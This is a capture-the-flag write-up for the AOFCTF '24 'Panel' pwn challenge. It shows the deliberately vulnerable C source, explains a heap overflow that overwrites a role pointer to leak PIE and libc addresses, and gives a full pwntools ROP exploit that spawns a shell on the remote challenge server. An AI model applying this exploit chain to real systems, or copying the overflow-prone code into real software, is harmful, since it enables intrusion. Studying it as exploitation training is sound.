---
title: AOFCTF '24 - Pwn - Panel
date: '2024-04-29'
tags: ['pwn', 'aofctf', 'pointer-overwrite', 'dereference-leak', 'ret2libc']
draft: false
summary: Overflowing a buffer in a pointer which overwrites the pointer, giving us an arbitrary read, then utilizing pointer dereferencing to leak libc value from GOT and performing a simple ret2libc.
---

## Challenge Description

![alt text](/static/writeups/aofctf-24/image-13.png)

## Solution

Following files were provided:

```bash
$ tar -tf panel.tar
panel
panel.c
Dockerfile
flag.txt
```

Similar to all other challs, [patching the binary with the libc from the dockerfile](https://gist.github.com/TheFlash2k/50008e1ba8b3e7e6169642e636996e51).

Looking at the mitigations on this binary:

```bash
$ checksec panel
[*] '/home/pwn/Documents/CTFs/AOFCTF-24/pwn/panel/panel'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled

```

Let's analyze the provided source:

```c:panel.c
// Compile: gcc -o partial partial.c -fPIC -fno-stack-protector

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <string.h>
#include <unistd.h>

__attribute__((constructor))
void __constructor__(){
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    signal(SIGALRM, exit);
    alarm(0x20);
}

const char *GUEST_ROLE = "guest";
const char *ADMIN_ROLE = "admin";

typedef struct {
    char name[50];
    char *role;
} userProfile;
userProfile *p;

int menu() {
    int choice;
    puts("== Menu ==");
    puts("1. Set name");
    puts("2. Set role");
    puts("3. Show profile");
    puts("4. Access secret area");
    puts("0. Exit");
    printf("> ");
    scanf("%d", &choice);
    return choice;
}

void set_name() {
    char name[50];
    printf("Enter your name: ");
    if(p->name[0] == '\0') {
        return read(STDIN_FILENO, p->name, 0x100);
    }
    read(STDIN_FILENO, name, 0x100);
    strncpy(p->name, name, 0x100);
}

void set_role() {
    puts("Due to recent breaches. Users can't change their roles. However, if you don't have a role, you'll be assigned guest!");
    if (p->role == NULL) {
        p->role = GUEST_ROLE;
    }
}

void show_profile() {
    printf("Name: %s\n", p->name);
    printf("Role: %s\n", p->role);
}

int main() {

    p = malloc(sizeof(userProfile));
    p->role = NULL;
    memset(p->name, 0, 50);

    while (1) {
        switch (menu()) {
            case 1:
                set_name();
                break;
            case 2:
                set_role();
                break;
            case 3:
                show_profile();
                break;
            case 4:
                if (p->role == ADMIN_ROLE) {
                    puts("Welcome admin!");
                    puts("[UNIMPLEMENTED] - This is an unimplemented feature :(");
                } else {
                    puts("You're not an admin!");
                }
                break;
            case 0:
                return 0;
            default:
                puts("Invalid choice!");
                break;
        }
    }
    return 0;

}
```

For this, let's look at the `userProfile` struct:

```c:panel.c
typedef struct {
    char name[50];
    char *role;
} userProfile;
userProfile *p;
```

We see that the struct has two attributes, `name` which as an array of `50` bytes and a pointer. Then a pointer instance is declared as a global variable. In the `main` function:

```c
p = malloc(sizeof(userProfile));
p->role = NULL;
```

Which means that each attribute will have an 8-byte aligned chunk. The name chunk would actually be `56` bytes in size. And since the `*role` is in the struct, it would be adjacent to this chunk. Therefore, if we have an overflow, we can overflow data into this chunk. This can also be used as a `read` primitive. Let's analyze the functions:

```c:set_name
void set_name() {
    char name[50];
    printf("Enter your name: ");
    if(p->name[0] == '\0') {
        return read(STDIN_FILENO, p->name, 0x100);
    }
    read(STDIN_FILENO, name, 0x100);
    strncpy(p->name, name, 0x100);
}
```

The buffer overflow here is apparent. Straight forward, however, we need to note one thing, if the first byte of `p->name` is a null byte, we can read directly into the p->name variable. This primitive allows us to write directly upto `role*` giving us an arbitrary read of address. Whereas, if it is not null byte, we can read into `name` which is stored in this function's stack and then we copy into the struct. Meaning, we can control the flow of execution here.

```c:set_role
void set_role() {
    puts("Due to recent breaches. Users can't change their roles. However, if you don't have a role, you'll be assigned guest!");
    if (p->role == NULL) {
        p->role = GUEST_ROLE;
    }
}
```

The `set_role` function is pretty straight forward. It simply sets the pointer to `GUEST_ROLE`. Which is a string:

```c:roles
const char *GUEST_ROLE = "guest";
const char *ADMIN_ROLE = "admin";
```

The last function is `show_profile`

```c:show_profile
void show_profile() {
    printf("Name: %s\n", p->name);
    printf("Role: %s\n", p->role);
}
```

In this function, we simply print the values. However, this function gives us an arbitrary read by dereferencing `p->role` pointer, which we can control by bof.

## Exploitation

The exploitation steps are as follows:

- Overflow the null-byte of `name` chunk on heap for PIE leak
- Write GOT.PUTS in `p->role` to get a libc leak
- ROP

### Overflow the null-byte of `name` chunk on heap for PIE leak

As we've already learnt that since the `userProfile`'s pointer is allocated on the heap, each chunk will be `8-byte` aligned. Therefore, the `name` array would be stored on the heap with `56` bytes size. If and the `role` pointer would be stored directly next to, if we were to manually `set role` and then `set name`, and enter exactly `56` characters (not a `new line`), we would overwrite the last null-byte of `name`. Then, if we were to call `show_profile`, printf would continue until it would reach a null-byte. So, the null-byte would be reached in the `role`'s address, which will print the raw-bytes and hence leak PIE-address of `GUEST`.

For this, the following exploit is sufficient:

```py:exploit.py
#!/usr/bin/env python3

from pwn import *
context.terminal = ["tmux", "splitw", "-h"]
encode = lambda e: e if type(e) == bytes else str(e).encode()
hexleak = lambda l: int(l[:-1] if l[-1] == '\n' else l, 16)
fixleak = lambda l: unpack(l[:-1].ljust(8, b"\x00"))

exe = "./panel_patched"
elf = context.binary = ELF(exe)
libc = elf.libc
io = remote(sys.argv[1], int(sys.argv[2])) if args.REMOTE else process()
if args.GDB: gdb.attach(io, "")

io.sendlineafter(b"> ", b"2") # set role
payload = flat(cyclic(56, n=8))
io.sendlineafter(b"> ", b"1") # set name
io.sendafter(b": ", payload)
io.sendlineafter(b"> ", b"3") # show profile
```

If we run this in GDB and analyze the heap, we can see:

![alt text](/static/writeups/aofctf-24/image-23.png)

`0x5626ad9a22a0` is where the `userProfile *` is allocated. And adjacent to that, is the `role*`, stored at `2d8`. If we see the output now:

![alt text](/static/writeups/aofctf-24/image-24.png)

We have the PIE leak now, we can parse it:

```py:exploit.py
io.recv(62)
leak = fixleak(io.recvline())
elf.address = leak - 0x2008
print("elf @ %#x" % elf.address)
```

```bash
$ ./exploit.py
[*] '/home/pwn/Documents/CTFs/AOFCTF-24/pwn/panel/panel_patched'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'.'
[*] '/home/pwn/Documents/CTFs/AOFCTF-24/pwn/panel/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process '/home/pwn/Documents/CTFs/AOFCTF-24/pwn/panel/panel_patched': pid 303955
elf @ 0x559984acf000
[*] Switching to interactive mode
Role: guest
== Menu ==
1. Set name
2. Set role
3. Show profile
4. Access secret area
0. Exit
>
```

### Write GOT.PUTS in `p->role` to get a libc leak

Now this portion is pretty straight forward, we can simply overflow into the `role*` and we can write `got.puts` into the address, this will allow us to dereference `got.puts` which will point to a libc address, and hence give us a libc leak. We already know that at offset `56`, we start overwriting the `*role`.

So, the exploit for this portion becomes:

```py:exploit.py
payload = flat(cyclic(56, n=8),elf.got.puts)
io.sendlineafter(b"> ", b"1")
io.sendafter(b": ", payload)
io.sendlineafter(b"> ", b"3")
io.recvuntil(b"Role: ")
puts = fixleak(io.recvline())
libc.address = puts - libc.sym.puts

print("libc @ %#x" % libc.address)
```

### ROP

This portion is pretty self-explanatory, we already have an overflow; so yeah. The final exploit becomes:

```py
#!/usr/bin/env python3

from pwn import *
context.terminal = ["tmux", "splitw", "-h"]
encode = lambda e: e if type(e) == bytes else str(e).encode()
hexleak = lambda l: int(l[:-1] if l[-1] == '\n' else l, 16)
fixleak = lambda l: unpack(l[:-1].ljust(8, b"\x00"))

exe = "./panel_patched"
elf = context.binary = ELF(exe)
libc = elf.libc
io = remote(sys.argv[1], int(sys.argv[2])) if args.REMOTE else process()
if args.GDB: gdb.attach(io, "")

io.sendlineafter(b"> ", b"2")
payload = flat(cyclic(56, n=8))
io.sendlineafter(b"> ", b"1")
io.sendafter(b": ", payload)
io.sendlineafter(b"> ", b"3")

io.recv(62)
leak = fixleak(io.recvline())
elf.address = leak - 0x2008
print("elf @ %#x" % elf.address)

payload = flat(cyclic(56, n=8),elf.got.puts)
io.sendlineafter(b"> ", b"1")
io.sendafter(b": ", payload)
io.sendlineafter(b"> ", b"3")
io.recvuntil(b"Role: ")
puts = fixleak(io.recvline())
libc.address = puts - libc.sym.puts

print("libc @ %#x" % libc.address)

POP_RDI = libc.address + 0x000000000002a3e5
RET = libc.address + 0x0000000000029139
payload = flat(
    cyclic(72, n=8),
    POP_RDI,
    next(libc.search(b"/bin/sh")),
    RET,
    libc.sym.system
)
io.sendlineafter(b"> ", b"1")
io.sendlineafter(b": ", payload)

io.interactive()
```

Running this against remote:

```bash
$ ./exploit.py REMOTE challs.airoverflow.com 34381
[*] '/home/pwn/Documents/CTFs/AOFCTF-24/pwn/panel/panel_patched'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'.'
[*] '/home/pwn/Documents/CTFs/AOFCTF-24/pwn/panel/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to challs.airoverflow.com on port 34381: Done
elf @ 0x558b906a5000
libc @ 0x7f4d1d93d000
[*] Switching to interactive mode
$ ls -l
total 24
-r--r----- 1 root ctf-player    59 Apr 28 19:27 flag.txt
-r-xr-x--- 1 root ctf-player 16808 Apr 23 12:24 panel
$ cat flag.txt
AOFCTF{sm4rt_w0rk_with_g0t_dereference_MRIdHKLOK7ygJdjvQM}
```
